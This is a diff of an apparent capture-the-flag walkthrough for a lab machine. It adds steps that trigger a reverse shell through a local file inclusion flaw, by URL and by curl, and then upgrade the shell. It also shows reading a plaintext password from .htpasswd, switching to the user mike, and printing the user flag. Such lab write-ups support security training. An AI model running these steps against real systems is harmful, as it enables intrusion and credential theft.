@@ -131,7 +131,6 @@ Load that with the LFI vulnerability in the URL: `http://10.129.95.185/?file=/va
 - If your text loads in the browser window, you're good.
 - Continued below DirBusting...
 
-
 ## DirBusting 
 
 Unnecessary. Since you can traverse the directory structure via LFI, just use the default directories in /etc/passwd as above.
@@ -193,6 +192,70 @@ listening on [any] 1234 ...
 ```
 
 Execute the reverse shell via the browswer URL: `http://10.129.95.185/?file=/var/lib/tftpboot/shell.php`
-- Attach machine receives the reverse shell.
-- User: www-data
-- 
+- Could run it with curl: `curl 'http://10.129.95.185/?file=/var/lib/tftpboot/shell.php'`
+- Attack machine receives the reverse shell.
+- User: www-data 
+- Upgrade the shell: `/bin/bash -i` or `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+
+## Lateral Movement
+
+The current user (www-data) has no perms to get anywhere. 
+- Look around for ways to become user 'mike' (see the /etc/passwd results above; mike is the only other user besides root).
+- Good place to look for login credentials: `/var/log/html/'
+```
+www-data@included:/var/www/html$ ls -la
+ls -la
+total 88
+drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
+drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
+-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
+-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
+-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
+-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
+-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
+-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
+-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
+```
+
+Low-hanging Fruit: 
+```
+www-data@included:/var/www/html$ cat .htpasswd
+cat .htpasswd
+mike:Sheffield19
+```
+
+Become mike: 
+```
+www-data@included:/var/www/html$ su -h
+su -h
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+
+www-data@included:/var/www/html$ su -l mike
+su -l mike
+Password: Sheffield19
+
+mike@included:~$ 
+```
+
+User Flag: 
+```
+mike@included:~$ cd /home/mike
+cd /home/mike
+mike@included:~$ ls
+ls
+user.txt
+mike@included:~$ cat user.txt
+cat user.txt
+a56ef91d70cfbf2cdb8f454c006935a1
+```
